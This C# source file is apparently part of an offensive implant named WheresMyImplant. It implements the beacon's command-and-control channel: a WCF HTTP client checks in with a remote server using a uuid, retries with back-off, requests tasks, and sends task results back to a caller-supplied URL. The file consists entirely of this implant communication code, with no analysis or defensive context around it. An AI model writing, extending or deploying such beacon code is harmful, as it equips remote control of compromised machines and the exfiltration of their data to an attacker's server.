using System;
using System.Reflection;
using System.ServiceModel;
using System.Threading;

namespace WheresMyImplant
{
    [ServiceContract]
    interface IServiceBeaconEndpoint
    {
        [OperationContract]
        String Checkin(String uuid);

        [OperationContract]
        String TaskingRequest(String uuid);

        [OperationContract]
        String TaskingResponse(String uuid, String results);
    }

    ////////////////////////////////////////////////////////////////////////////////
    public class WebServiceBeaconComs
    {
        private static BasicHttpBinding httpBinding = new BasicHttpBinding();

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static Boolean InvokeRequest(String url, String method, String[] args, ref String output)
        {
            using (ChannelFactory<IServiceBeaconEndpoint> channelFactory =
                new ChannelFactory<IServiceBeaconEndpoint>(httpBinding, url))
            {
                IServiceBeaconEndpoint iServiceEndpoint = channelFactory.CreateChannel();
                try
                {
                    MethodInfo methodInfo = iServiceEndpoint.GetType().GetMethod(method);
                    output = (String)methodInfo.Invoke(iServiceEndpoint, args);
                    return true;
                }
                catch (TargetInvocationException)
                {
                    return false;
                }
                catch (Exception error)
                {
                    Console.WriteLine(error);
                    return false;
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static Boolean Checkin(String url, String uuid)
        {
            String output = "";
            Int32 i = 0;
            while (!InvokeRequest(url, "Checkin", new String[] { uuid }, ref output))
            {
                Console.WriteLine("Checkin");
                Thread.Sleep((5 * 1000)  + ((i++ * 10) * 1000));
                if (5 == i)
                {
                    return false;
                }
            }
            Console.WriteLine(output);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static Boolean Response(String url, String uuid, String[] taskingReturn)
        {
            String output = "";
            Int32 i = 0;
            while (!InvokeRequest(url, "TaskingResponse", taskingReturn, ref output))
            {
                Thread.Sleep(5 + (i++ * 10));
                if (5 == i)
                {
                    return false;
                }
            }
            return true;
        }
    }
}